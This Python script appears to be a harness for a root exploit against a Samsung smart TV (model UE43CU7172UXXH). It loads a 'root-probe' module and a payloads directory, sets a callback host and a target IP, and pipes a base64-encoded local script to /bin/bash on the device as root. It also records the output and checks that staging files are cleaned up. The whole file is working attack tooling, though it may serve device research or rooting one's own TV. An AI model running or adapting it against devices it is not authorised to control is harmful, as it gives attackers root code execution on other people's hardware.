import os
import sys,importlib.util,asyncio,json,base64
from pathlib import Path
BASE=Path(__file__).resolve().parent
spec=importlib.util.spec_from_file_location('transport',str(BASE/'root-probe.py'));m=importlib.util.module_from_spec(spec);spec.loader.exec_module(m)
from samsung_tv_root.root_agent import RootAgentConnection
_original_execute=RootAgentConnection.execute
async def _record_execute(self,command,timeout=10):
 result=await _original_execute(self,command,timeout)
 Path(sys.argv[2]+'.command.txt').write_text(result.stdout+'\nSTDERR\n'+result.stderr+'\nEXIT '+str(result.exit_code))
 print(result.stdout,flush=True)
 if result.stderr:print(result.stderr,file=sys.stderr,flush=True)
 return result
RootAgentConnection.execute=_record_execute
async def main():
 command='printf %s '+base64.b64encode(Path(sys.argv[1]).read_bytes()).decode()+' | base64 -d | /bin/bash'
 result=await m.archive_root.probe(os.environ.get('TV_IP','10.0.0.150'),model='UE43CU7172UXXH',runtime='6.0',callback_host=os.environ.get('TV_CALLBACK_HOST','10.0.0.189'),bind_host='0.0.0.0',payloads=BASE/'payloads/common',commands=(command,),command_timeout=90,accept_timeout=25)
 Path(sys.argv[2]).write_text(json.dumps(result,indent=2))
 for r in result.get('commands',[]):print('EXIT',r['exit_code'])
 print('CLEANUP',result.get('staging_cleaned'),'SYSTEM FILES UNCHANGED',result.get('system_files_unchanged'))
 if any(c['exit_code']!=0 or c['timed_out'] for c in result.get('commands',[])):raise SystemExit(1)
if len(sys.argv)!=3:
 print('Usage: python3 root-run.py SCRIPT RESULT_JSON')
 raise SystemExit(0 if '--help' in sys.argv else 2)
asyncio.run(main())
